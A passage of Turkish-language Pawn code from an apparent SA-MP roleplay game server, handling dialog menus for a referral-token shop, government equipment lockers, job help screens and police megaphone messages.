			ShowPlayerDialogEx(playerid,INFO_DIALOG,DIALOG_STYLE_MSGBOX,"Öneri Sistemi Bilgilendirmesi", "Eðer önerdiðin oyuncu sen offlineyken 8 saatini doldurursa, oyuna girdiðinde jeton karakterine otomatik olarak eklecenektir.\n\nÖneri jetonlarýný /refmarket yazarak iþine yarayacak eþyalar ile takas edebilirsin.\n\nBiri seni önerdikten sonra o kiþinin 8 saati dolmadan isim deðiþtirmemelisin.\nYoksa jeton alamazsýn.","Kapat","");
		}
	}
	else if(dialogid == DIALOG_REFSHOP)
	{
		if(response)
		{
			if(listitem == 0)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 1)
			    {
       				PlayerInfo[playerid][pRefTokens] -= 1;

			        PlayerInfo[playerid][pPot] += 50;
			        PlayerInfo[playerid][pCrack] += 25;
			        SendClientMessage(playerid, COLOR_YELLOW, "ÖNERÝ SÝSTEMÝ: 1 öneri jetonu harcayarak 50 gram pot ve 25 gram crack aldýn.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "Bu item için yeterli öneri jetonun yok.");
			}
			else if(listitem == 1)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 1)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 1;

			        PlayerInfo[playerid][pMats] += 2500;
			        SendClientMessage(playerid, COLOR_YELLOW, "ÖNERÝ SÝSTEMÝ: 1 öneri jetonu harcayarak 2.500 materyal aldýn.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "Bu item için yeterli öneri jetonun yok.");
			}
			else if(listitem == 2)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 1)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 1;

			        PlayerInfo[playerid][pRespect] += 4;
			        SendClientMessage(playerid, COLOR_YELLOW, "ÖNERÝ SÝSTEMÝ: 1 öneri jetonu harcayarak 4 saygý puaný aldýn.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "Bu item için yeterli öneri jetonun yok.");
			}
			else if(listitem == 3)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 1)
			    {
			        if(PlayerInfo[playerid][pConnectTime] < 2) return SendClientMessage(playerid, COLOR_WHITE, "Silah kullanma yasaðýn varken silah alamazsýn.");
		         	PlayerInfo[playerid][pRefTokens] -= 1;

			        GivePlayerValidWeapon(playerid, 24, 60000);
			        GivePlayerValidWeapon(playerid, 27, 60000);
			        SendClientMessage(playerid, COLOR_YELLOW, "ÖNERÝ SÝSTEMÝ: 1 öneri jetonu harcayarak SPAS-12 ve Desert Eagle aldýn.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "Bu item için yeterli öneri jetonun yok.");
			}
			else if(listitem == 4)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 2)
			    {
       				PlayerInfo[playerid][pRefTokens] -= 2;

			        PlayerInfo[playerid][pPot] += 100;
			        PlayerInfo[playerid][pCrack] += 50;
			        SendClientMessage(playerid, COLOR_YELLOW, "ÖNERÝ SÝSTEMÝ: 2 öneri jetonu harcayarak 100 gram pot ve 50 gram crack aldýn.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "Bu item için yeterli öneri jetonun yok.");
			}
			else if(listitem == 5)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 2)
			    {
			        if(PlayerInfo[playerid][pConnectTime] < 2) return SendClientMessage(playerid, COLOR_WHITE, "Silah kullanma yasaðýn varken silah alamazsýn.");
		         	PlayerInfo[playerid][pRefTokens] -= 2;

		        	GivePlayerValidWeapon(playerid, 27, 60000);
		        	GivePlayerValidWeapon(playerid, 24, 60000);
		        	GivePlayerValidWeapon(playerid, 31, 60000);
		        	GivePlayerValidWeapon(playerid, 34, 60000);
		        	GivePlayerValidWeapon(playerid, 29, 60000);
			        SendClientMessage(playerid, COLOR_YELLOW, "ÖNERÝ SÝSTEMÝ: 2 öneri jetonu harcayarak full silah seti aldýn.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "Bu item için yeterli öneri jetonun yok.");
			}
			else if(listitem == 6)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 2)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 2;

			        PlayerInfo[playerid][pRespect] += 8;
			        SendClientMessage(playerid, COLOR_YELLOW, "ÖNERÝ SÝSTEMÝ: 2 öneri jetonu harcayarak 5 saygý puaný aldýn.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "Bu item için yeterli öneri jetonun yok.");
			}
			else if(listitem == 7)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 2)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 2;

			        PlayerInfo[playerid][pMats] += 5000;
			        SendClientMessage(playerid, COLOR_YELLOW, "ÖNERÝ SÝSTEMÝ: 2 öneri jetonu harcayarak 5.000 materyal aldýn.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "Bu item için yeterli öneri jetonun yok.");
			}
			else if(listitem == 8)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 3)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 3;

			        PlayerInfo[playerid][pRespect] += 12;
			        SendClientMessage(playerid, COLOR_YELLOW, "ÖNERÝ SÝSTEMÝ: 3 adet öneri jetonu harcayarak 12 saygý puaný aldýn.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "Bu item için yeterli öneri jetonun yok.");
			}
			else if(listitem == 9)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 3)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 3;

			        PlayerInfo[playerid][pMats] += 10000;
			        SendClientMessage(playerid, COLOR_YELLOW, "ÖNERÝ SÝSTEMÝ: 3 adet öneri jetonu harcayarak 10.000 materyal aldýn.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "Bu item için yeterli öneri jetonun yok.");
			}
			else if(listitem == 10)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 4)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 4;

			        PlayerInfo[playerid][pRespect] += 16;
			        SendClientMessage(playerid, COLOR_YELLOW, "ÖNERÝ SÝSTEMÝ: 4 adet öneri jetonu harcayarak 16 saygý puaný aldýn.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "Bu item için yeterli öneri jetonun yok.");
			}
			else if(listitem == 11)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 4)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 4;

			        PlayerInfo[playerid][pMats] += 15000;
			        SendClientMessage(playerid, COLOR_YELLOW, "ÖNERÝ SÝSTEMÝ: 4 adet öneri jetonu harcayarak 15.000 materyal aldýn.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "Bu item için yeterli öneri jetonun yok.");
			}
			else if(listitem == 12)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 5)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 5;

			        PlayerInfo[playerid][pRespect] += 20;
			        SendClientMessage(playerid, COLOR_YELLOW, "ÖNERÝ SÝSTEMÝ: 5 adet öneri jetonu harcayarak 20 saygý puaný aldýn.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "Bu item için yeterli öneri jetonun yok.");
			}
			else if(listitem == 13)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 5)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 5;

			        PlayerInfo[playerid][pMats] += 20000;
			        SendClientMessage(playerid, COLOR_YELLOW, "ÖNERÝ SÝSTEMÝ: 5 adet öneri jetonu harcayarak 20.000 materyal aldýn.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "Bu item için yeterli öneri jetonun yok.");
			}
			else if(listitem == 14)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 10)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 10;

        			new nxtlevel = PlayerInfo[playerid][pLevel]+1;
					format(string, sizeof(string), "~g~LEVEL ATLADIN~n~~w~Artik %d Levelsin", nxtlevel);
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					PlayerInfo[playerid][pLevel]++;
					PlayerInfo[playerid][gPupgrade] = PlayerInfo[playerid][gPupgrade]+2;
					GameTextForPlayer(playerid, string, 5000, 1);
					SetPlayerScore(playerid, PlayerInfo[playerid][pLevel]);

			        SendClientMessage(playerid, COLOR_YELLOW, "ÖNERÝ SÝSTEMÝ: 10 adet öneri jetonu kullanarak saygý puaný gerekmeden level atladýn ve 2 geliþim puaný kazandýn. (/gelisim)");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "Bu item için yeterli öneri jetonun yok.");
			}
			else if(listitem == 15)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 10)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 10;

					new log[128];
					format(log, sizeof(log), "%s 10 adet öneri jetonu harcadý ve bedava araç için bekliyor.", GetPlayerNameEx(playerid));
					Log("logs/referralcars.log", log);

					format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s, 10 adet öneri jetonu harcayarak bedava araç seçeneðini seçti. Þimdi aracý için bekliyor.", GetPlayerNameEx(playerid));
					ABroadCast(COLOR_YELLOW, string, 4);

                    format(PlayerInfo[playerid][pFlag], 128, "Bedava Araç (Yalnýzca araç satýcýsýndan alabileceklerinden)");

					SendClientMessage(playerid, COLOR_YELLOW, "ÖNERÝ SÝSTEMÝ: 10 adet öneri jetonu harcayarak bedava araç aldýn. Otomatik olarak bayrak kondu, yakýnda ödülünü alacaksýn.");
			        SendClientMessage(playerid, COLOR_YELLOW, "ÖNERÝ SÝSTEMÝ: Bu nadir verilen bir ödüldür ve verilmesi 48 saati bulabilir. 4 level ve üzeri admin arayýn.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "Bu item için yeterli öneri jetonun yok.");
			}
		}
	}
	else if(dialogid == GOVLOCKERMENU) {
		// Uniform then Equipment

		if(!response)
		    return 1;

		switch(listitem) {
			case 0: ShowPlayerDialogEx(playerid, GOVSKINMENU, DIALOG_STYLE_LIST, "Devlet Skin Menü", "17 (siyah takýmelbise)\n57 (takým elbiseli asyalý)\n141 (genç asyalý bayan)\n147 (orta yaþlý beyaz)\n240 (zýrhlý genç beyaz)\n295 (takým elbiseli, yaþlý beyaz)", "Tamam", "Iptal");
			case 1: ShowPlayerDialogEx(playerid, GOVEQUIPMENU, DIALOG_STYLE_LIST, "Devlet Ekipman Menüsü", "Ýlk Yardým Kiti\nZýrh\nDesert Eagle\nMP5\nShotgun\nM4\nAksesuarlar", "Tamam", "Iptal");
			case 2: ShowPlayerDialogEx(playerid, FDUTYMENU4, DIALOG_STYLE_INPUT, "Gizli","Skin seçin (ID kullanarak).", "Seç", "Iptal");
		}
	}
	else if(dialogid == GOVEQUIPMENU) {
		if(!response)
		    return 1;

		switch(listitem) {
			case 0: SetPlayerHealth(playerid, 100);
			case 1: SetPlayerArmourEx(playerid, 100);
			case 2: GivePlayerValidWeapon(playerid, 24, 99999);
			case 3: GivePlayerValidWeapon(playerid, 29, 99999);
			case 4: GivePlayerValidWeapon(playerid, 25, 99999);
			case 5: GivePlayerValidWeapon(playerid, 31, 99999);
			case 6: ShowPlayerDialogEx(playerid, BUYTOYSCOP, DIALOG_STYLE_MSGBOX, "Aksesuarlar", "Devlet memurlarýnýn aksesuar dolabýna hoþgeldiniz.","Devam", "Iptal");
		}
	}
	else if(dialogid == GOVSKINMENU) {
		if(!response)
		    return 1;

		switch(listitem) {
			case 0: {
				SetPlayerSkin(playerid, 17);
				PlayerInfo[playerid][pSkin] = 17;
			}
			case 1:  {
				SetPlayerSkin(playerid, 57);
				PlayerInfo[playerid][pSkin] = 57;
			}
			case 2: {
				SetPlayerSkin(playerid, 141);
				PlayerInfo[playerid][pSkin] = 141;
			}
			case 3: {
				SetPlayerSkin(playerid, 147);
				PlayerInfo[playerid][pSkin] = 147;
			}
			case 4: {
				SetPlayerSkin(playerid, 240);
				PlayerInfo[playerid][pSkin] = 240;
			}
			case 5: {
				SetPlayerSkin(playerid, 295);
				PlayerInfo[playerid][pSkin] = 295;
			}
		}
	}
    else if(dialogid == JOBHELPMENU)
	{
 		if(response)
		{
			if(listitem == 0) //Detective
			{
				ShowPlayerDialogEx(playerid, DETECTIVEJOB, DIALOG_STYLE_MSGBOX, "Dedektif", "Bilgi:\n\nBu meslek San Andreas'daki herhangi birinin yerini bulmak için kullanýlýr.\nBu meslek devlet oluþumlarýna çok yardýmcý olan bir meslektir. Legal bir meslektir.\nBulmaya çalýþtýðýn kiþinin sana son bulunduðu yeri söyleyecektir. Eðer yeteri kadar yakýn isen, haritada görebileceksin.", "Devam", "Iptal");
			}
			if(listitem == 1) // Lawyer
			{
				ShowPlayerDialogEx(playerid, LAWYERJOB, DIALOG_STYLE_MSGBOX, "Avukat", "Bilgi:\n\nBu meslek suçlularýn aranma seviyelerini düþürmek, mahkumlarýn hapis sürelerini azaltmak ve tüm suçlularý görmek için kullanýlýr.\nAranan azýnlý suçlulara yardýmcý olabileceðiniz önemli bir meslektir ve legaldir.\nEðer bir arkadaþýn yada aile bireyinin baþý polisler ile beladaysa bu meslek iþininize yarayacaktýr.", "Devam", "Iptal");
			}
			if(listitem == 2) //Whore
			{
				ShowPlayerDialogEx(playerid, WHOREJOB, DIALOG_STYLE_MSGBOX, "Hayat Kadýný", "Bilgi:\n\nBu meslek, eðlenmek isteyen müþterileri memnun etmek için kullanýlýr.\nBu meslek gelen müþterilere sex teklif eden bir meslektir.\nBu meslek illegaldir ve yaparken yakalanabilirsiniz.", "Devam", "Iptal");
			}
			if(listitem == 3) //Drug Dealer
            {
				ShowPlayerDialogEx(playerid, DRUGDEALERJOB, DIALOG_STYLE_MSGBOX, "Uyuþturucu Satýcýsý", "Bilgi:\n\nBu meslek, almak isteyen oyunculara pot ve crack satmak için kullanýlýr.\nMeslekte yüksek level olduðunuz zaman kullanýþlýdýr.\nLevel atladýkça daha fazla crack & pot taþýyabilirsin.\nBu meslek illegaldir ve yaparken yakalanabilirsiniz.", "Devam", "Iptal");
			}
			if(listitem == 4) //Mechanic
			{
				ShowPlayerDialogEx(playerid, MECHANICJOB, DIALOG_STYLE_MSGBOX, "Tamirci", "Bilgi:\n\nBu meslek araç tamir etmek, nos ve hidrolik eklemek için kullanýlýr.\nBu meslek bazen iyi para kazandýrýr ancak bazý zamanlarda kimsenin yardýma ihtiyacý olmaz.\nBu meslek legal bir meslektir.", "Devam", "Iptal");
			}
			if(listitem == 5) //Bodyguard
			{
				ShowPlayerDialogEx(playerid, BODYGUARDJOB, DIALOG_STYLE_MSGBOX, "Bodyguard", "Bilgi:\n\nBu meslek oyunculara yarým zýrh vermek içindir.\nBu meslek karlý bir meslektir. Özellikle GYM'nin orda zýrh isteyenler bulunmaktadýr.\nBu meslek legal bir meslektir.", "Devam", "Iptal");
			}
			if(listitem == 6) //Arms Dealer
			{
				ShowPlayerDialogEx(playerid, ARMSDEALERJOB, DIALOG_STYLE_MSGBOX, "Silah Satýcýsý", "Bilgi:\n\nBu meslek oyunculara silah satmak için kullanýlýr.\nBu meslek karlý bir meslektlir. Level atladýkça büyük silahlar satar daha fazla para kazanýrsýnýz.\nBu meslek illegaldir ve yaparken yakalanabilirsiniz.", "Devam", "Iptal");
			}
			if(listitem == 7) //Boxer
			{
				ShowPlayerDialogEx(playerid, BOXERJOB, DIALOG_STYLE_MSGBOX, "Boksör", "Bilgi:\n\nBu meslek Ganton GYM içerisinde dövüþmenizi saðlar.\nBu meslek karlý bir meslek deðildir ancak þampiyon olabilirsin.\nBu meslek legal bir meslektir.", "Devam", "Iptal");
			}
 			if(listitem == 8) //Drug Smuggling
            {
				ShowPlayerDialogEx(playerid, SMUGGLEJOB, DIALOG_STYLE_MSGBOX, "Uyuþturucu Kaçakçýsý", "Bilgi:\n\nBu meslek crack laboratuvarýndaki crackleri ve pot evindeki potlarý dolu tutmaya yarar.\nBu meslek birçok kiþi genellikle pot ve crack aldýðýndan dolayý karlýdýr. Ancak bazen crack ve potlarýnýzý çalmaya çalýþýrlar.\nBu meslek illegaldir ve yaparken yakalanabilirsiniz.", "Devam", "Iptal");
			}
			if(listitem == 9) //Craftsman
            {
				ShowPlayerDialogEx(playerid, CRAFTJOB, DIALOG_STYLE_MSGBOX, "Zanaatkar", "Bilgi:\nBu meslek elde edilen zanaatleri baþka oyunculara satmak için kullanýlýr.\nBu meslekte birçok önemli eþya yapýldýðýndan dolayý, oldukça karlýdýr.\nBu meslek legal bir meslektir.\n\nKomutlar:\n/paketal /zanaat\nMesleðin Yeri: Bu meslek Willowfield'deki  hurdalýkta bulunan meslek ikonundan alýnabilir. (sarý ikon)", "Bitir", "Iptal");
			}
			if(listitem == 10) //Bartender
            {
				ShowPlayerDialogEx(playerid, BARTENDERJOB, DIALOG_STYLE_MSGBOX, "Barmen", "Bilgi:\nBu meslek baþka oyunculara içki satmak için kullanýlabilir.\nBu meslek legal bir meslektir.\n\nKomutlar:\n/iceceksat\nMesleðin Yeri: Bu meslek Alhambra Kulübü'nün içerisindeki meslek ikonundan alýnabilir. (sarý ikon)", "Bitir", "Iptal");
			}
			if(listitem == 11) //Trucker
            {
				ShowPlayerDialogEx(playerid, TRUCKERJOB, DIALOG_STYLE_MSGBOX, "Kamyoncu","Bilgi:\nBu meslek kamyon teslimatlarý yaparak para kazanmanýzý saðlar\nBu bir legal meslektir. Ancak illegal eþyalar taþýrsanýz yada kamyon soyarsanýz yakalanabilirsiniz. \n\nKomutlar:\n/yukyukle /yukkontrol /yukcal\nMesleðin Yeri: Bu meslek Ocean Docks'taki meslek alma ikonundan alýnabilir. (sarý ikon)", "Bitir", "Iptal");
			}
			if(listitem == 12) //Pizza Boy
            {
				ShowPlayerDialogEx(playerid, PIZZAJOB, DIALOG_STYLE_MSGBOX, "Pizzacý","Bilgi:\nBu meslek az ama hýzlý yoldan para kazanmak için kullanýlabilir. Idlewood pizzacýsýndan pizzalarý verilen adrese teslim etmeniz gerek.\n Ne kadar geç giderseniz, o kadar az para kazanýrsýnýz.\n\nKomutlar:\n/pizzaal\nMesleðin Yeri: Bu meslek Idlewood pizzacýsýnýn içerisinde bulunan meslek ikonundan alýnabilir. (sarý ikon)", "Bitir", "Iptal");
			}
		}
	}
	else if(dialogid == SMUGGLEJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, SMUGGLEJOB3, DIALOG_STYLE_MSGBOX, "Uyuþturucu Kaçakçýsý", "Komutlar:\n\n/kasaal [isim(Pot/Crack)]\n\nMesleðin Yeri: Bu mesleði Crack Laboratuvar'ýnýn önündeki meslek ikonundan alabilirsin.(sarý ikon)", "Bitir", "Iptal");
		}
	}
	else if(dialogid == SMUGGLEJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, SMUGGLEJOB2, DIALOG_STYLE_MSGBOX, "Uyuþturucu Kaçakçýsý", "Not: Uyuþturucu kaçýrmak için bir bekleme süresi yok ancak daha fazla para kazanmak için level atlamalýsýn. Bu meslek için 5 level var.", "Devam", "Iptal");
  		}
 	}
	else if(dialogid == TAXIJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, TAXIJOB2, DIALOG_STYLE_MSGBOX, "Taksici", "Not: Bu meslekte herhangi bir bekleme süresi ve meslek leveli yoktur. Baþka bir deyiþle, daha fazla para kazanmak için level atlamaya ihtiyaç yok.", "Devam", "Iptal");
		}
	}
	else if(dialogid == TAXIJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, TAXIJOB3, DIALOG_STYLE_MSGBOX, "Taksici", "Komutlar:\n\n/taksimetre [$1 - $50]\n\nMesleðin Yeri: Bu meslek taksi duraðýnýn önündeki meslek ikonunun önünden alýnabilir. (sarý ikon)", "Bitir", "Iptal");
		}
	}
	if(dialogid == BOXERJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, BOXERJOB3, DIALOG_STYLE_MSGBOX, "Boksör", "Komutlar:\n\n/dovus [playerid/Name], /boxistatistik\n\nMesleðin Yeri: Bu meslek GYM içerisindeki meslek ikonundan alýnabilir. (sarý ikon)", "Bitir", "Iptal");
		}
	}
	else if(dialogid == BOXERJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, BOXERJOB2, DIALOG_STYLE_MSGBOX, "Boksör", "Not: Bu meslekte dövüþmek için bekleme süresi yok ve 3 level var.\n\nLevel 1: Acemi Boksör.\nLevel 2: Amatör Boksör.\nLevel 3: Profesyonel Boksör.", "Devam", "Iptal");
		}
	}
	if(dialogid == ARMSDEALERJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, ARMSDEALERJOB2, DIALOG_STYLE_MSGBOX, "Silah Satýcýsý", "Not: Bu meslekte silah satma süresi her zaman 10 saniyedir.\n\nYetenekler:\n\nLevel 1 Silahlarý: Çiçekler, Muþta, SDPistol, ve Shotgun.\nLevel 2 Silahlarý: Bezbol Sopasý, Baston, MP5, ve Rifle.\nLevel 3 Silahlarý: Kürek ve Deagle.\nLevel 4 Silahlarý: Istaka, Golf Sopasý, AK47 ve M4.\nLevel 5 Silahlarý: Katana, Dildo, Sniper ve SPAS12.", "Devam", "Iptal");
		}
	}
	else if(dialogid == ARMSDEALERJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, ARMSDEALERJOB3, DIALOG_STYLE_MSGBOX, "Silah Satýcýsý", "Komutlar:\n\n/paketal, /silahsat\n\nMesleðin Yeri: Bu meslek haritada silah ikonu olan büyük silahçýnýn önündeki meslek ikonundan alýnabilir.", "Bitir", "Iptal");
		}
	}
	else if(dialogid == BODYGUARDJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, BODYGUARDJOB3, DIALOG_STYLE_MSGBOX, "Bodyguard", "Komutlar:\n\n/zirhsat[Oyuncu ID/Ýsim] [Ücret $200 - $1000]\n\nMesleðin Yeri: Bu meslek Ganton GYM'in önündeki meslek ikonunndan alýnabilir. (sarý ikon)", "Bitir", "Iptal");
		}
	}
	if(dialogid == BODYGUARDJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, BODYGUARDJOB2, DIALOG_STYLE_MSGBOX, "Bodyguard", "Not: Bu meslekte level yoktur. Komutlarýn kullaným süreleri 10 saniyedir. Baþka bir deyiþle, daha fazla para kazanmak için level atlamaya ihtiyaç yok.", "Devam", "Iptal");
		}
	}
	else if(dialogid == MECHANICJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, MECHANICJOB2, DIALOG_STYLE_MSGBOX, "Tamirci", "Not: Meslekte komut kullanma süresi her zaman 1 dakikadýr.", "Devam", "Iptal");
		}
	}
	else if(dialogid == MECHANICJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, MECHANICJOB3, DIALOG_STYLE_MSGBOX, "Tamirci", "Komutlar:\n\n/fix, /tamtamir, /hidrolik, /nos, /tisbasi\n\nMesleðin Yeri: Bu meslek Ocean Docks'taki meslek ikonundan alýnabilir. (sarý ikon)", "Bitir", "Iptal");
		}
	}
	else if(dialogid == DRUGDEALERJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, DRUGDEALERJOB2, DIALOG_STYLE_MSGBOX, "Uyuþturucu Satýcýsý", "Not: Meslekte komut kullanma süresi her zaman 1 dakikadýr.\n\nYetenekler:\n\nLevel 1: 10 pot 5 crack taþýyabilirsin.\nLevel 2: 20 pot 15 crack taþýyabilirsin.\nLevel 3: 30 pot 15 crack taþýyabilirsin.\nLevel 4: 40 pot 20 crack taþýyabilirsin.\nLevel 5: 50 pot 25 crack taþýyabilirsin.", "Devam", "Iptal");
		}
	}
	else if(dialogid == DRUGDEALERJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, DRUGDEALERJOB3, DIALOG_STYLE_MSGBOX, "Uyuþturucu Satýcýsý", "Komutlar:\n\n/potsat, /potal, /cracksat, /crackal\n\nMesleðin Yeri: Bu meslek, Ganton GYM'in karþýsýnda bulunan haritadaki 'D' ikonundan alýnabilir.", "Bitir", "Iptal");
		}
	}
	else if(dialogid == WHOREJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, WHOREJOB3, DIALOG_STYLE_MSGBOX, "Hayat Kadýný", "Komutlar:\n\n/sex\n/sex müþteriye sex yapma isteði gönderen komuttur. yalnýzca araçtayken kullanýlabilir.\n\nMesleðin Yeri: Bu meslek, Pig Pen kulübü içerisindeki meslek ikonundan alýnabilir. (sarý ikon)", "Bitir", "Iptal");
		}
	}
	else if(dialogid == LAWYERJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, LAWYERJOB3, DIALOG_STYLE_MSGBOX, "Avukat", "Komutlar:\n\n/koru, /serbestbirak, /arananlar, /avukatisbasi\n\nMesleðin Yeri: Bu meslek Downtown Los Santos bankasýnýn yakýnýndaki ikondan alýnabilir.(haritadaki sarý ikon)", "Bitir", "Iptal");
		}
	}
	else if(dialogid == WHOREJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, WHOREJOB2, DIALOG_STYLE_MSGBOX, "Hayat Kadýný", "Not: Meslekte komut kullanma süresi her zaman 1 dakikadýr.\n\nYetenekler:\n\nLevel 1: Birine AIDS bulaþtýrma/olma þansýn çok yüksek.\nLevel 2: Birine AIDS bulaþtýrma/olma þansýn yüksek.\nLevel 3: Birine AIDS bulaþtýrma/olma þansýn orta seviye.\nLevel 4: Birine AIDS bulaþtýrma/olma þansýn düþük seviye.\nLevel 5: Birine AIDS bulaþtýrma/olma þansýn çok düþük seviye.", "Devam", "Iptal");
		}
	}
	else if(dialogid == LAWYERJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, LAWYERJOB2, DIALOG_STYLE_MSGBOX, "Avukat", "Not: Meslekte level atladýkça, komutlarý tekrar kullanabilme süreleri azalýr.\n\nYetenekler:\n\nLevel 1: Mahkumlarýn cezalarýný 1 dakika azaltabilirsin.\nLevel 2: Mahkumlarýn cezalarýný 2 dakika azaltabilirsin.\nLevel 3: Mahkumlarýn cezalarýný 3 dakika azaltabilirsin.\nLevel 4: Mahkumlarýn cezalarýný 4 dakika azaltabilirsin.\nLevel 5: Mahkumlarýn cezalarýný 5 dakika azaltabilirsin.", "Devam", "Iptal");
		}
	}
	else if(dialogid == DETECTIVEJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, DETECTIVEJOB3, DIALOG_STYLE_MSGBOX, "Dedektif", "Komutlar:\n\n//takipet\n/takipet bir oyuncunun anlýk yerini bulabileceðin bir komuttur.\n\nMesleðin Yeri: Bu meslek Los Santos Polis Departmaný içerisinden alýnabilir.", "Bitir", "Iptal");
		}
	}
    else if(dialogid == DETECTIVEJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, DETECTIVEJOB2, DIALOG_STYLE_MSGBOX, "Dedektif", "Yetenekler:\n\nLevel 1: Kiþiyi 4 saniyeliðine bulabilirsin.Kullanma süresi 2 dakikadýr.\nLevel 2: Kiþiyi 6 saniyeliðine bulabilirsin. Kullanma süresi 80 saniyedir.\nLevel 3: Kiþiyi 8 saniyeliðine bulabilirsin.Kullanma süresi 1 dakikadýr.\nLevel 4: \nLevel 3: Kiþiyi 10 saniyeliðine bulabilirsin.Kullanma süresi 30 saniyedir.\nLevel 5: Kiþiyi 12 saniyelik bulabilirsin.Kullanma süresi 15 saniyedir.", "Devam", "Iptal");
		}
	}
	else if(dialogid == DIALOGMEGAFON)
	{
        new szMessage[128];
		if(response)
		{
			if(listitem == 0)
			{
			    format(szMessage, sizeof(szMessage), "(megafon) %s: Teslim ol etrafýn sarýldý!", GetPlayerNameEx(playerid));
				ProxDetector(60.0, playerid, szMessage, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW);
			}
			if(listitem == 1)
			{
			    format(szMessage, sizeof(szMessage), "(megafon) %s: Orada olduðunu biliyoruz.", GetPlayerNameEx(playerid));
				ProxDetector(60.0, playerid, szMessage, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW);
			}
			if(listitem == 2)
			{
			    format(szMessage, sizeof(szMessage), "(megafon) %s: Hey sen! Polis. Dur!", GetPlayerNameEx(playerid));
				ProxDetector(60.0, playerid, szMessage, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW);
			}
			if(listitem == 3)
			{
			    format(szMessage, sizeof(szMessage), "(megafon) %s: L.S.P.D! Olduðun yerde kal!", GetPlayerNameEx(playerid));
				ProxDetector(60.0, playerid, szMessage, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW);
			}
			if(listitem == 4)
			{
			    format(szMessage, sizeof(szMessage), "(megafon) %s: Olduðun yerde kal. Yoksa ateþ açacaðýz!", GetPlayerNameEx(playerid));
				ProxDetector(60.0, playerid, szMessage, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW);
			}
			if(listitem == 5)
			{
			    format(szMessage, sizeof(szMessage), "(megafon) %s: Hadi! Hadi! Hadi!", GetPlayerNameEx(playerid));
				ProxDetector(60.0, playerid, szMessage, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW);
			}
			if(listitem == 6)
			{
			    format(szMessage, sizeof(szMessage), "(megafon) %s: Polis! Kýpýrdama!", GetPlayerNameEx(playerid));
				ProxDetector(60.0, playerid, szMessage, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW);
			}
